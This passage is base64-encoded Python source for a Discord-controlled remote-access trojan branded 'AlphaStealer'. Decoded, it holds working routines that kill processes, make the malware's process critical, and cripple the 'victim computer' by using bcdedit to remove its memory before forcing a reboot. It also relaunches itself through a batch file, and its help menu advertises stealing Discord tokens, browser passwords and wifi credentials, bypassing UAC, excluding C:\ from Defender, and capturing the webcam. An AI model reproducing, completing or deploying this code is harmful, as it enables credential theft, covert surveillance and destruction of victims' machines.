hjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZChmIuKaoO+4jyBFcnJvciBhbCB0ZXJtaW5hciBlbCBQSUQge3BpZH06IHtzdHIoZSl9IikNCiAgICBlbHNlOg0KICAgICAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKFsncGlkJywgJ25hbWUnXSk6DQogICAgICAgICAgICBpZiBwcm9jLmluZm9bJ25hbWUnXSBhbmQgcHJvYy5pbmZvWyduYW1lJ10ubG93ZXIoKSA9PSB0YXJnZXQubG93ZXIoKToNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIHByb2MudGVybWluYXRlKCkNCiAgICAgICAgICAgICAgICAgICAga2lsbGVkICs9IDENCiAgICAgICAgICAgICAgICBleGNlcHQgcHN1dGlsLkFjY2Vzc0RlbmllZDoNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBpZiBraWxsZWQgPiAwOg0KICAgICAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ1Byb2Nlc3MgS2lsbGVkOiB7dGFyZ2V0fSAoYHtraWxsZWR9YCkuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZChmIuKdjCBObyBzZSBlbmNvbnRyYXJvbiBwcm9jZXNvcyBjb24gZWwgbm9tYnJlIGB7dGFyZ2V0fWAgbyBubyBzZSBwdWRpZXJvbiBtYXRhci4iKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nbW91c2Vsb2MnKQ0KYXN5bmMgZGVmIG1vdXNlcG9zdChjdHgsIHg6IGludCwgeTogaW50KToNCiAgICB0cnk6DQogICAgICAgIHNjcmVlbl93aWR0aCwgc2NyZWVuX2hlaWdodCA9IHB5YXV0b2d1aS5zaXplKCkNCiAgICAgICAgaWYgMCA8PSB4IDw9IHNjcmVlbl93aWR0aCBhbmQgMCA8PSB5IDw9IHNjcmVlbl9oZWlnaHQ6DQogICAgICAgICAgICBweWF1dG9ndWkubW92ZVRvKHgsIHkpDQogICAgICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnTW91c2UgbW92ZWQgc3VjY2Vzc2Z1bGx5IHRvIChge3h9LCB7eX1gKS4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGYi4p2MIENvb3JkZW5hZGFzIGZ1ZXJhIGRlIGxhIHBhbnRhbGxhICh7c2NyZWVuX3dpZHRofXh7c2NyZWVuX2hlaWdodH0pLiIpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBhd2FpdCBjdHguc2VuZChmIuKaoO+4jyBFcnJvciBhbCBtb3ZlciBlbCBtb3VzZToge3N0cihlKX0iKQ0KDQpkZWYgc2V0X2NyaXRpY2FsKGZsYWc6IGJvb2wpOg0KICAgIGhUb2tlbiA9IGN0eXBlcy53aW50eXBlcy5IQU5ETEUoKQ0KICAgIFRPS0VOX0FESlVTVF9QUklWSUxFR0VTID0gMHgyMA0KICAgIFRPS0VOX1FVRVJZID0gMHg4DQogICAgU0VfUFJJVklMRUdFX0VOQUJMRUQgPSAweDINCiAgICBwcml2aWxlZ2VfaWQgPSBjdHlwZXMud2ludHlwZXMuTFVJRCgpDQoNCiAgICBjdHlwZXMud2luZGxsLmFkdmFwaTMyLk9wZW5Qcm9jZXNzVG9rZW4oDQogICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuR2V0Q3VycmVudFByb2Nlc3MoKSwNCiAgICAgICAgVE9LRU5fQURKVVNUX1BSSVZJTEVHRVMgfCBUT0tFTl9RVUVSWSwNCiAgICAgICAgY3R5cGVzLmJ5cmVmKGhUb2tlbikNCiAgICApDQoNCiAgICBjdHlwZXMud2luZGxsLmFkdmFwaTMyLkxvb2t1cFByaXZpbGVnZVZhbHVlVygNCiAgICAgICAgTm9uZSwgIlNlRGVidWdQcml2aWxlZ2UiLCBjdHlwZXMuYnlyZWYocHJpdmlsZWdlX2lkKQ0KICAgICkNCg0KICAgIGNsYXNzIFRPS0VOX1BSSVZJTEVHRVMoY3R5cGVzLlN0cnVjdHVyZSk6DQogICAgICAgIF9maWVsZHNfID0gWygiUHJpdmlsZWdlQ291bnQiLCBjdHlwZXMud2ludHlwZXMuRFdPUkQpLA0KICAgICAgICAgICAgICAgICAgICAoIlByaXZpbGVnZXMiLCBjdHlwZXMud2ludHlwZXMuTFVJRF9BTkRfQVRUUklCVVRFUyAqIDEpXQ0KDQogICAgdHAgPSBUT0tFTl9QUklWSUxFR0VTKCkNCiAgICB0cC5Qcml2aWxlZ2VDb3VudCA9IDENCiAgICB0cC5Qcml2aWxlZ2VzWzBdLkx1aWQgPSBwcml2aWxlZ2VfaWQNCiAgICB0cC5Qcml2aWxlZ2VzWzBdLkF0dHJpYnV0ZXMgPSBTRV9QUklWSUxFR0VfRU5BQkxFRA0KDQogICAgY3R5cGVzLndpbmRsbC5hZHZhcGkzMi5BZGp1c3RUb2tlblByaXZpbGVnZXMoaFRva2VuLCBGYWxzZSwgY3R5cGVzLmJ5cmVmKHRwKSwgMCwgTm9uZSwgTm9uZSkNCg0KICAgIGlzX2NyaXRpY2FsID0gMSBpZiBmbGFnIGVsc2UgMA0KICAgIGN0eXBlcy53aW5kbGwubnRkbGwuUnRsU2V0UHJvY2Vzc0lzQ3JpdGljYWwoaXNfY3JpdGljYWwsIE5vbmUsIEZhbHNlKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nY3JpdHByb2MnKQ0KQENoZWNrQ2F0ZWdvcnkNCmFzeW5jIGRlZiBjcml0cHJvYyhjdHgpOg0KICAgIGlmIFByb3RlY3RvcjoNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoJ+KdjCBFcnJvcjogUHJvdGVjdG9yIG1vZGUgZW5hYmxlZC4nKQ0KICAgICAgICByZXR1cm4NCiAgICB0cnk6DQogICAgICAgIHNldF9jcml0aWNhbChUcnVlKQ0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdUaGUgcHJvY2VzcyBpcyBjcml0aWNhbC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBhd2FpdCBjdHguc2VuZChmIuKdjCBFcnJvcjoge2V9IikNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3VuY3JpdHByb2MnKQ0KQENoZWNrQ2F0ZWdvcnkNCmFzeW5jIGRlZiB1bmNyaXRwcm9jKGN0eCk6DQogICAgaWYgUHJvdGVjdG9yOg0KICAgICAgICBhd2FpdCBjdHguc2VuZCgn4p2MIEVycm9yOiBQcm90ZWN0b3IgbW9kZSBlbmFibGVkLicpDQogICAgICAgIHJldHVybg0KICAgIHRyeToNCiAgICAgICAgc2V0X2NyaXRpY2FsKEZhbHNlKQ0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdUaGUgcHJvY2VzcyBpcyB1bmNyaXRpY2FsLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGYi4p2MIEVycm9yOiB7ZX0iKQ0KDQpkZWYgZ2V0X3RvdGFsX3Zpc2libGVfbWVtb3J5KCk6DQogICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5ydW4oWyd3bWljJywgJ29zJywgJ2dldCcsICdUb3RhbFZpc2libGVNZW1vcnlTaXplJ10sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkNCiAgICBsaW5lcyA9IHJlc3VsdC5zdGRvdXQuc3BsaXRsaW5lcygpDQogICAgcmV0dXJuIGludChsaW5lc1sxXS5zdHJpcCgpKQ0KDQpkZWYgc2V0X3JlbW92ZV9tZW1vcnkoYW1vdW50KToNCiAgICBzdWJwcm9jZXNzLnJ1bihbJ2JjZGVkaXQuZXhlJywgJy9zZXQnLCAncmVtb3ZlbWVtb3J5Jywgc3RyKGFtb3VudCldKQ0KDQpkZWYgUnVuS2lsbENvbXB1dGVyKCk6DQogICAgc3lzdGVtX3JhbSA9IGdldF90b3RhbF92aXNpYmxlX21lbW9yeSgpDQogICAgDQogICAgbWVtb3J5X3RvX3JlbW92ZSA9IHN5c3RlbV9yYW0gLSAxDQoNCiAgICBzZXRfcmVtb3ZlX21lbW9yeShtZW1vcnlfdG9fcmVtb3ZlKQ0KDQogICAgc3VicHJvY2Vzcy5ydW4oJ3NodXRkb3duIC1yIC1mIC10IDAnKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0na2lsbGNvbXB1dGVyJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYga2lsbGNvbXB1dGVyKGN0eCk6DQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2NlcycsIGRlc2NyaXB0aW9uPSfimKAgS2lsbGluZyB0aGUgdmljdGltIGNvbXB1dGVyLi4uJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1SdW5LaWxsQ29tcHV0ZXIsIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCmxhbmd1YWdlX2NvZGVzID0gew0KICAgICdlbi1VUyc6ICdJbmdsw6lzIChFc3RhZG9zIFVuaWRvcyknLA0KICAgICdlcy1FUyc6ICdFc3Bhw7FvbCAoRXNwYcOxYSknLA0KICAgICdmci1GUic6ICdGcmFuY8OpcyAoRnJhbmNpYSknLA0KICAgICdkZS1ERSc6ICdBbGVtw6FuIChBbGVtYW5pYSknLA0KICAgICdpdC1JVCc6ICdJdGFsaWFubyAoSXRhbGlhKScsDQogICAgJ3B0LVBUJzogJ1BvcnR1Z3XDqXMgKFBvcnR1Z2FsKScsDQogICAgJ25sLU5MJzogJ0hvbGFuZMOpcyAoUGHDrXNlcyBCYWpvcyknLA0KICAgICdwbC1QTCc6ICdQb2xhY28gKFBvbG9uaWEpJywNCiAgICAncnUtUlUnOiAnUnVzbyAoUnVzaWEpJywNCiAgICAnemgtQ04nOiAnQ2hpbm8gU2ltcGxpZmljYWRvIChDaGluYSknLA0KICAgICdqYS1KUCc6ICdKYXBvbsOpcyAoSmFww7NuKScsDQogICAgJ2tvLUtSJzogJ0NvcmVhbm8gKENvcmVhIGRlbCBTdXIpJywNCiAgICAnYXItU0EnOiAnw4FyYWJlIChBcmFiaWEgU2F1ZGl0YSknLA0KICAgICd0ci1UUic6ICdUdXJjbyAoVHVycXXDrWEpJywNCiAgICAnc3YtU0UnOiAnU3VlY28gKFN1ZWNpYSknLA0KICAgICdkYS1ESyc6ICdEYW7DqXMgKERpbmFtYXJjYSknLA0KICAgICdmaS1GSSc6ICdGaW5sYW5kw6lzIChGaW5sYW5kaWEpJywNCiAgICAnbm8tTk8nOiAnTm9ydWVnbyAoTm9ydWVnYSknLA0KICAgICdjcy1DWic6ICdDaGVjbyAoUmVww7pibGljYSBDaGVjYSknLA0KICAgICdlbC1HUic6ICdHcmllZ28gKEdyZWNpYSknLA0KICAgICdodS1IVSc6ICdIw7puZ2FybyAoSHVuZ3LDrWEpJywNCiAgICAncm8tUk8nOiAnUnVtYW5vIChSdW1hbsOtYSknLA0KICAgICdiZy1CRyc6ICdCw7psZ2FybyAoQnVsZ2FyaWEpJywNCiAgICAnc2stU0snOiAnRXNsb3ZhY28gKEVzbG92YXF1aWEpJywNCiAgICAnaHItSFInOiAnQ3JvYXRhIChDcm9hY2lhKScsDQogICAgJ3NyLVJTJzogJ1NlcmJpbyAoU2VyYmlhKScsDQp9DQoNCkBib3QuY29tbWFuZChuYW1lPSdjZ2xlbmd1YWdlJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgY2dsZW5ndWFnZShjdHgsIGlkaW9tYTogc3RyKToNCiAgICB0cnk6DQogICAgICAgIGlmIGlkaW9tYSBub3QgaW4gbGFuZ3VhZ2VfY29kZXM6DQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZChmIuKdjCBJZGlvbWEgbm8gdsOhbGlkby4gSWRpb21hcyBwZXJtaXRpZG9zOiB7JywgJy5qb2luKGxhbmd1YWdlX2NvZGVzLmtleXMoKSl9IikNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICANCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJwb3dlcnNoZWxsIiwgIlNldC1XaW5VSUxhbmd1YWdlT3ZlcnJpZGUiLCAiLUxhbmd1YWdlIiwgaWRpb21hXSwgY2hlY2s9VHJ1ZSkNCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJwb3dlcnNoZWxsIiwgIlNldC1XaW5Vc2VyTGFuZ3VhZ2VMaXN0IiwgaWRpb21hXSwgY2hlY2s9VHJ1ZSkNCg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdMZW5ndWFnZSBjaGFuZ2VkIHN1Y2Nlc3NmdWxseS4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBhd2FpdCBjdHguc2VuZChmIuKdjCBPY3VycmnDsyB1biBlcnJvcjoge2V9IikNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2NnaG91cicpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIGNnaG91cihjdHgsIGhvcmE6IHN0cik6DQogICAgdHJ5Og0KICAgICAgICBpZiBub3QgaG9yYSBvciBsZW4oaG9yYSkgIT0gNSBvciBob3JhWzJdICE9ICc6JyBvciBub3QgaG9yYVs6Ml0uaXNkaWdpdCgpIG9yIG5vdCBob3JhWzM6XS5pc2RpZ2l0KCk6DQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgi4p2MIEZvcm1hdG8gZGUgaG9yYSBpbnbDoWxpZG8uIFVzYSBlbCBmb3JtYXRvIEhIOk1NLiIpDQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgiYGBgVXNlOiAuY2dob3VyIDE4OjQ5YGBgIikNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICANCiAgICAgICAgaG91ciwgbWludXRlID0gbWFwKGludCwgaG9yYS5zcGxpdCgiOiIpKQ0KDQogICAgICAgIGlmIG5vdCAoMCA8PSBob3VyIDwgMjQpIG9yIG5vdCAoMCA8PSBtaW51dGUgPCA2MCk6DQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgi4p2MIExhIGhvcmEgbyBsb3MgbWludXRvcyBubyBzb24gdsOhbGlkb3MuIExhIGhvcmEgZGViZSBlc3RhciBlbnRyZSAwMDowMCB5IDIzOjU5LiIpDQogICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInBvd2Vyc2hlbGwiLCBmIlNldC1EYXRlIC1Ib3VyIHtob3VyfSAtTWludXRlIHttaW51dGV9Il0sIGNoZWNrPVRydWUpDQogICAgICAgIA0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdIb3VyIGNoYW5nZWQgc3VjY2Vzc2Z1bGx5LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICANCiAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IgYXMgZToNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZiLinYwgT2N1cnJpw7MgdW4gZXJyb3IgYWwgY2FtYmlhciBsYSBob3JhOiB7ZX0iKQ0KICAgIA0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZiLinYwgRXJyb3IgaW5lc3BlcmFkbzoge2V9IikNCg0KZGVmIFJlT3Blbk1hbHdhcmUoKToNCiAgICBvcy5jaGRpcihmJ0M6XFxVc2Vyc1xce3VzZXJuYW1lfVxcRG9jdW1lbnRzJykNCiAgICB3aXRoIG9wZW4oJ2J5cGFzcy5iYXQnLCAndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6DQogICAgICAgIGYud3JpdGUoZidAZWNobyBvZmZcblxuc3RhcnQgQzpcXFVzZXJzXFx7dXNlcm5hbWV9XFxBcHBEYXRhXFxSb2FtaW5nXFxIeWRyYUxhdW5jaGVyXFxIeWRyYUxhdW5jaGVyXFxIeWRyYUxhdW5jaGVyLmV4ZVxuZXhpdCcpDQogICAgb3Muc3lzdGVtKGYnc3RhcnQgQzpcXFVzZXJzXFx7dXNlcm5hbWV9XFxEb2N1bWVudHNcXGJ5cGFzcy5iYXQnKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ncmVvcGVuJykNCmFzeW5jIGRlZiByZW9wZW4oY3R4KToNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdNYWx3YXJlIHJlb3BlbmVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgZW1iZWQgPSBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1SZU9wZW5NYWx3YXJlLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0naGVscCcpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIEhlbHBDb21tYW5kKGN0eCk6DQogICAgZW1iZWQxID0gZGlzY29yZC5FbWJlZCh0aXRsZT0i8J2VrPCdlpHwnZaV8J2WjfCdlobwnZW+8J2WmfCdlorwnZaG8J2WkfCdlorwnZaXIC0g8J2VrvCdlpTwnZaS8J2WkvCdlobwnZaT8J2WifCdlpggKPCdlpXwnZaG8J2Wl/CdlpkgMSkiLCBkZXNjcmlwdGlvbj0nR2xvYmFsIENvbW1hbmRzJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQxLmFkZF9maWVsZChuYW1lPSfwn4aYYC5oZWxwYCcsIHZhbHVlPSdTaG93IHRoaXMgbWVzc2FnZS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQxLmFkZF9maWVsZChuYW1lPSfwn5KJYC5hbnRpa2lsbHByb2NgJywgdmFsdWU9J0VuYWJsZSBQcm90ZWN0b3IgTW9kZSBvbiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9J/Cfko5gLnRva2Vuc2AnLCB2YWx1ZT0nR2V0IGFsbCBkaXNjb3JkIHRva2VucyBvbiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9J/CflJFgLmJyb3dzZXJpbmZvYCcsIHZhbHVlPSdHZXQgdGhlIHZpY3RpbSBwYXNzd29yZHMsIGhpc3RvcnkgZXRjLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9J/Cfm5xgLndpZmlgJywgdmFsdWU9J0dldCB0aGUgdmljdGltIHdpZmkgY3JlZGVudGlhbHMuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMS5hZGRfZmllbGQobmFtZT0n8J+nv2AuYnlwYXNzYCcsIHZhbHVlPSdSZW9wZW4gdGhlIHZpcnVzIHdpdGggQWRtaW4gUHJtcyBvZiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9J/CfjIBgLnVhY2J5cGFzc2AnLCB2YWx1ZT0nQnlwYXNzIEFkbWluIG9mIHRoZSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQxLmFkZF9maWVsZChuYW1lPSfwn5O3YC5jYXBgJywgdmFsdWU9J01ha2UgYSBzY3JlZW5zaG90IG9uIHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMS5hZGRfZmllbGQobmFtZT0n8J+TuGAuY2FwbG9vcGAnLCB2YWx1ZT0nU3RhcnQgYnVjbGUgb24gdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQxLmFkZF9maWVsZChuYW1lPSfwn5O4YC5jYXBsb29wc3RvcGAnLCB2YWx1ZT0nU3RvcCBidWNsZSBvbiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9J/Cfl7pgLmdlb2xvY2F0ZWAnLCB2YWx1ZT0nR2VvbG9jYXRlIHRoZSBpcCBvZiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9Jzw6c2h1dGRvd246MTM2NTcwNzY0NjQ5NzE5NDEwND5gLnNodXRkb3duYCcsIHZhbHVlPSdTaHV0ZG93biB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9Jzw6cmVsb2FkOjEzNjU3MDk5Mjk4NTEyNTY4MzI+YC5yZXN0YXJ0YCcsIHZhbHVlPSdSZXN0YXJ0IHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMS5hZGRfZmllbGQobmFtZT0nPDpvZmY6MTM2NTcxMDQyOTY3ODIxMTEyMj5gLmxvZ29mZmAnLCB2YWx1ZT0nQ2xvc2Ugc2Vzc2lvbiBvZiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9J/Cfn6ZgLmJsdWVzY3JlZW5gJywgdmFsdWU9J0NhdXNlIGEgYmx1ZXNjcmVlbiBvbiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9J/Cfm6FgLmRlZmVuZGVyZXhjbHVzaW9uYCcsIHZhbHVlPSdBZGQgdGhlIHBhcnRpdGlvbiBDOlwgdG8gZXhjbHVzaW9ucy4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQxLmFkZF9maWVsZChuYW1lPSc8OkVycm9yOjEzNjU3NjE5MDExNjU4MDU2MDk+YC5lcnJvcm1zZyA8dGl0bGU+IDxtZXNzYWdlPmAnLCB2YWx1ZT0nU2VuZCBhIGVycm9yIG1lc3NhZ2UuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMS5hZGRfZmllbGQobmFtZT0nPDppbmZvOjEzNjU3NjE4OTc3OTM4NDczMzc+YC5pbmZvbXNnIDx0aXRsZT4gPG1lc3NhZ2U+YCcsIHZhbHVlPSdTZW5kIGEgaW5mbyBtZXNzYWdlLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDEuYWRkX2ZpZWxkKG5hbWU9JzxhOldhcm5pbmc6MTM2NTc2MTg5NTY2NzMzOTM1ND5gLndhcm5tc2cgPHRpdGxlPiA8bWVzc2FnZT5gJywgdmFsdWU9J1NlbmQgYSB3YXJuIG1lc3NhZ2UuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMS5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KDQogICAgZW1iZWQyID0gZGlzY29yZC5FbWJlZCh0aXRsZT0i8J2VrPCdlpHwnZaV8J2WjfCdlobwnZW+8J2WmfCdlorwnZaG8J2WkfCdlorwnZaXIC0g8J2VrvCdlpTwnZaS8J2WkvCdlobwnZaT8J2WifCdlpggKPCdlpXwnZaG8J2Wl/CdlpkgMikiLCBkZXNjcmlwdGlvbj0nR2xvYmFsIENvbW1hbmRzJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQyLmFkZF9maWVsZChuYW1lPSfwn5O3YC5nZXRjYW1zYCcsIHZhbHVlPSdHZXQgdGhlIG51bWJlciBvZiB2aWN0aW0gY2FtLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDIuYWRkX2ZpZWxkKG5hbWU9J/Cfk7hgLnBob3RvY2FtYCcsIHZhbHVlPSdNYWtlIGEgcGhvdG8gd2l0aCB0aGUgdmljdGltIGNhbS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQyLmFkZF9maWVsZChuYW1lPSfwn46lYC52aWRlb2NhbWAnLCB2YWx1ZT0nTWFrZSBhIHZpZGVvIHdpdGggdGhlIHZpY3RpbSBjYW0uJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMi5hZGRfZmllbGQobmFtZT0n8J+Tt2Auc2V0Y2FtIDxjYW0+YCcsIHZhbHVlPSdTZWxlY3QgYW4gdmljdGltIGNhbSBmb3IgdXNlLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDIuYWRkX2ZpZWxkKG5hbWU9Jzw6Qm9tYjoxMzY1ODAxMzA0OTgyODE0ODUyPmAuYm9tYmAnLCB2YWx1ZT0nU3RhcnQgYSBib21iLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDIuYWRkX2ZpZWxkKG5hbWU9Jzw6RGNIOjEzNjU5NTY2MTk3ODcxNzgwMDQ+YC53ZWIgPHVybD5gJywgdmFsdWU9J09wZW4gYSB3ZWJzaXRlIG9uIHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMi5hZGRfZmllbGQobmFtZT0nPDpEY0g6MTM2NTk1NjYxOTc4NzE3ODAwND5gLndlYmNyYXNoIDx1cmw+IDx0aW1lcz5gJywgdmFsdWU9J09wZW4gd2Vic2l0ZXMgb24gdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQyLmFkZF9maWVsZChuYW1lPSc8OnZvbHVtZToxMzY1OTU3ODU5MjE2NDU3NzM4PmAudm9sdW1lIDwwLTEwMD5gJywgdmFsdWU9J0NoYW5nZSB0aGUgdm9sdW1lIG9mIHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMi5hZGRfZmllbGQobmFtZT0nPDp2b2x1bWU6MTM2NTk1Nzg1OTIxNjQ1NzczOD5gLnZvbHVtZXVwYCcsIHZhbHVlPSdTZXQgdGhlIHZvbHVtZSB0byAxMDAlLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDIuYWRkX2ZpZWxkKG5hbWU9Jzw6dm9sdW1lOjEzNjU5NTc4NTkyMTY0NTc3Mzg+YC